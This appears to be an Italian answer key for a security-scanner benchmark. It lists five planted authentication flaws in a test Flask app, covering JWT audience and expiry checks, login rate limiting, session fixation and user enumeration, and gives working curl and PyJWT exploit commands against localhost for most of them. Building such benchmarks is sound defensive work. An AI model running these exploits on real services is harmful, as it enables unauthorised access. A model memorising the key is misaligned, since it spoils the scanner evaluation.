# Answer Key — Ground-Truth Validation Target

> **⚠️ QUESTO FILE NON VA LETTO NÉ FORNITO ALLO SCANNER O ALL'AGENTE CHE LO
> ESEGUE PRIMA DELLA VALIDAZIONE.**
> Va usato **solo** per confrontare i risultati a posteriori con le
> vulnerabilità attese, al fine di calcolare True Positive Rate e False
> Negative Rate.

---

## Note di revisione (2026-06-21)

**VULN-01 sostituita**: la versione originale (`alg:none` accettato) è stata
rimossa perché **non exploitable** con PyJWT ≥ 2.4 — la libreria lancia
`InvalidKeyError: When alg = "none", key value must be None` anche quando
`"none"` è nella whitelist e la chiave è non-vuota. È un controllo a livello
di libreria, non esposto alla logica applicativa.

**VULN-01 nuova**: mancata verifica del claim `aud` (audience). Confermata
exploitable con `curl` (200 OK con token `aud="attacker-service"`).

**VULN-02**: rimasta invariata — confirmata exploitable (token `exp=1` con firma
HS256 valida → 200 OK).

> **TPR calcolato su 5 vulnerabilità verificate come sfruttabili con `curl`,
> non sul totale pianificato originariamente (che includeva una vuln inerte).**

---

## Vulnerabilità presenti in `vulnerable_app/app.py`

| # | VULN ID | Nome | Endpoint | Riga approx. | Categoria OWASP API2:2023 | Test atteso |
|---|---------|------|----------|--------------|--------------------------|-------------|
| 1 | VULN-01 | Nessuna verifica claim `aud` (audience) | `GET /api/profile` | ~70-85 | Broken Authentication – Weak Token Validation | T04 (token replay / audience confusion) |
| 2 | VULN-02 | Token scaduto accettato | `GET /api/profile` | ~70-85 | Broken Authentication – Expired Token Accepted | T02 (expired JWT replay) |
| 3 | VULN-03 | Nessun rate limiting sul login | `POST /api/login` | ~48-50 | Broken Authentication – Credential Stuffing / Brute Force | T03 (brute-force login) |
| 4 | VULN-04 | Session fixation | `POST /api/login` | ~62-64 | Broken Authentication – Session Fixation | T06 (session fixation) |
| 5 | VULN-05 | User enumeration via messaggi di errore | `POST /api/login` | ~51-57 | Broken Authentication – User Enumeration | T11 (differential error response) |

---

## Dettaglio per vulnerabilità

### VULN-01 — Nessuna verifica claim `aud` *(aggiornata 2026-06-21)*
- **Evidenza nel codice**: `options={"verify_aud": False}` in `jwt.decode()`.
- **Come sfruttarla**:
  ```bash
  # Costruisci un token con aud sbagliato ma firma valida
  python3 -c "
  import jwt, time
  t = jwt.encode(
    {'sub':'testuser','role':'user','aud':'attacker-service',
     'iat':int(time.time()),'exp':int(time.time())+3600},
    'jwt-secret-do-not-use-in-prod', algorithm='HS256')
  print(t)
  " | xargs -I{} curl -s http://localhost:5001/api/profile -H "Authorization: Bearer {}"
  # Atteso: 200 OK con dati profilo (aud ignorato)
  ```

### VULN-02 — Token scaduto accettato
- **Evidenza nel codice**: `options={"verify_exp": False}`.
- **Come sfruttarla**:
  ```bash
  python3 -c "
  import jwt
  t = jwt.encode({'sub':'testuser','role':'user','iat':1,'exp':1},
    'jwt-secret-do-not-use-in-prod', algorithm='HS256')
  print(t)
  " | xargs -I{} curl -s http://localhost:5001/api/profile -H "Authorization: Bearer {}"
  # Atteso: 200 OK invece di 401 Expired
  ```

### VULN-03 — Nessun rate limiting
- **Come sfruttarla**:
  ```bash
  for i in $(seq 1 100); do
    curl -s -X POST http://localhost:5001/api/login \
      -H "Content-Type: application/json" \
      -d '{"username":"testuser","password":"wrong"}' -o /dev/null -w "%{http_code}\n"
  done
  # Atteso: tutte 401, mai 429
  ```

### VULN-04 — Session fixation
- **Come sfruttarla**: vedi README.md — usa cookie pre-login che sopravvive al login.

### VULN-05 — User enumeration
- **Come sfruttarla**:
  ```bash
  # Utente inesistente → 404
  curl -s -o /dev/null -w "%{http_code}" -X POST http://localhost:5001/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"nonexistent","password":"anything"}'
  # Output: 404

  # Utente esistente, password errata → 401
  curl -s -o /dev/null -w "%{http_code}" -X POST http://localhost:5001/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"testuser","password":"wrong"}'
  # Output: 401
  ```

---

## Tabella di scoring attesa (scanner ideale)

| | vulnerable_app | secure_app |
|-|:-:|:-:|
| VULN-01 No aud check | TP | TN |
| VULN-02 Expired token | TP | TN |
| VULN-03 No rate limit | TP | TN |
| VULN-04 Session fixation | TP | TN |
| VULN-05 User enumeration | TP | TN |

**TPR target**: 5/5 = 100% · **FPR target**: 0/5 = 0%

> **Base di calcolo**: 5 vulnerabilità verificate exploitable manualmente.
> VULN-01 originale (alg:none) è stata esclusa dal denominatore perché
> non sfruttabile con PyJWT ≥ 2.4.
